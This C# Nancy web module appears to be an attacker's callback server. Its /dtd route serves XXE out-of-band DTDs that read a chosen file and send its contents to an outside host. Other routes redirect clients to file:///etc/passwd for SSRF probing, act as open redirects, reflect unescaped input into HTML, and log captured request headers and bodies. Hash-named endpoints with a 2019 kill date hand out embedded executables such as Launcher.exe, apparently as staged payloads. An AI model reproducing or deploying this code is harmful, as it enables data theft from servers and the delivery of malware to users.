using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.IO;
using System.Web.Routing;
using Nancy;

namespace DuosWeb
{
    public class MainModule : NancyModule
    {
        public static List<RequestEntry> Data = new List<RequestEntry>();

        public MainModule()
        {

            Get["/preview"] = _ =>
            {
                string content = Request.Query.c;
                string img = Request.Query.i;
                return Negotiate.WithContentType("text/html").WithModel(Response.AsText("<html><head><title>"+content+"</title><meta property=\"og: title\" content='"+content+"'><meta property=\"og: image\" itemprop=\"image\" content=\""+img+"\"></head><body></body></html>"));
            };
            Get["/redirect"] = _ =>
            {
                string path = Request.Query.path;
                string tmp = Request.Query.tmp;
                if (tmp == "1")
                    path = "file://etc/passwd";
                else if (tmp == "2")
                    path = "file:///etc/passwd";
                return Response.AsRedirect(path);
            };

            Get["/image"] = _ =>
            {
                string location = Request.Query.loc;
                return Response.AsRedirect(location);
            };
            Get["/"] = _ =>
            {
                Data.Add(new RequestEntry()
                {
                    Date = DateTime.Now,
                    Info = getRaw()
                });
                return "main";
            };
            Post["/"] = _ =>
            {
                Data.Add(new RequestEntry()
                {
                    Date = DateTime.Now,
                    Info = getRaw()
                });
                return "<!-- added -->";
            };
            Get["/raw"] = _ =>
            {
                return Response.AsText(getRaw());
            };
            Post["/raw"] = _ =>
            {
                return Response.AsText(getRaw());
            };
            
            Get["/add"] = _ =>
            {
                Data.Add(new RequestEntry()
                {
                    Date = DateTime.Now,
                    Info = getRaw()
                });
                return "<!-- added -->";
            };
            Get["/list"] = _ =>
            {
                string result = "Now: " + DateTime.Now.ToLongTimeString() + "<br>";
                foreach (var d in Data)
                {
                    result += "<h1>" + d.Date.ToLongTimeString() + "</h1><p>" + d.Info + "<p>";
                }

                return result;
            };
            Get["/clear"] = _ =>
            {
                Data.Clear();
                return "cleared";
            };
            Get["/test"] = _ =>
            {
                return "test file content";
            };

            Get["/dtd"] = _ =>
            {
                string path = Request.Query.path;
                Data.Add(new RequestEntry()
                {
                    Date = DateTime.Now,
                    Info = "RESOURCE ACCESSED WITH PATH = " + path + "<br>" + getRaw()
                });

                return Response.AsText(System.IO.File.ReadAllText("C:\\e.dtd"));
                return Response.AsText("<?xml version=\"1.0\" encoding=\"UTF-8\"?><!ENTITY % file SYSTEM \"" + path + "\"><!ENTITY % all \"<!ENTITY send SYSTEM 'http://duos.apphb.com/tomtom/add?text=%file;'>\">%all;");
                //return Response.AsText("<?xml version=\"1.0\" encoding=\"UTF-8\"?><!ENTITY % file SYSTEM \"" + path + "\"><!ENTITY % all \"<!ENTITY send SYSTEM 'ftp://demo:password@test.rebex.net/text=%file;'>\">%all;");
                //return Response.AsText("<!ENTITY % payload SYSTEM \"" + path + "\"><!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'http://duos.apphb.com/tomtom/add?text=%payload;'>\"> %int; %trick;");
            };
            
            Get["/tomtom/{any*}"] = _ =>
            {
                Data.Add(new RequestEntry()
                {
                    Date = DateTime.Now,
                    Info = getRaw()
                });
                return "<!-- added -->";
            };

            Get["/b3433905ae609b25a44c96de506689bc"] = _ =>
            {
                if (DateTime.Now.Date > new DateTime(2019, 7, 18))
                    return string.Empty;
                return "SharpCompress.dll:LibCrypta.dll:Launcher.exe";
            };
            Get["/b3433905ae609b25a44c96de506689bc{id}"] = _ =>
            {
                if (DateTime.Now.Date > new DateTime(2019, 7, 18))
                    return string.Empty;
                int id = _.id;
                byte[] data;
                MemoryStream ms;
                switch (id)
                {
                    case 1:
                        data = Properties.Resources.SharpCompress;
                        ms = new MemoryStream(data);
                        return Response.FromStream(ms, "application/octet-stream");
                    case 2:
                        data = Properties.Resources.LibCrypta;
                        ms = new MemoryStream(data);
                        return Response.FromStream(ms, "application/octet-stream");
                    case 3:
                        data = Properties.Resources.Launcher;
                        ms = new MemoryStream(data);
                        return Response.FromStream(ms, "application/octet-stream");
                    default:
                        return string.Empty;
                }
            };
            Get["/fdd6e0e1461590d5d12cee056fcde3c9"] = _ =>
            {
                if (DateTime.Now.Date > new DateTime(2019, 7, 18))
                    return string.Empty;
                byte[] data = Properties.Resources.items2;
                MemoryStream ms = new MemoryStream(data);
                return Response.FromStream(ms, "application/octet-stream");
            };
            Get["/fdd6e0e1461590d5d12cee056fcde3c9q"] = _ =>
            {
                if (DateTime.Now.Date > new DateTime(2019, 7, 18))
                    return string.Empty;
                return "Debug\\VkMusicWPF.exe";
            };
        }

        string getRaw()
        {
            var dict = ((DynamicDictionary)Request.Query);
            string q = string.Join("&", dict.ToDictionary().Select(x => x.Key + "=" + x.Value));

            string raw = Request.Method + " " + Request.Path + (string.IsNullOrEmpty(q) ? string.Empty : "?" + q) + " " + Request.ProtocolVersion + "<br>";
            raw += Request.UserHostAddress + "<br>";
            raw += "Path: " + Request.Path + "<br>";
            foreach (var r in Request.Headers)
            {
                foreach (var v in r.Value)
                    raw += r.Key + ": " + v + "<br>";
            }
            raw += Environment.NewLine;
            
            raw += "<b>Query:</b><br>" + string.Join("&", new RouteValueDictionary(Request.Query).Select(x => x.Key + "=" + x.Value));
            raw += "<br><b>Body:</b><br>" + new System.IO.StreamReader(Request.Body).ReadToEnd();
            return raw;
        }
    }
}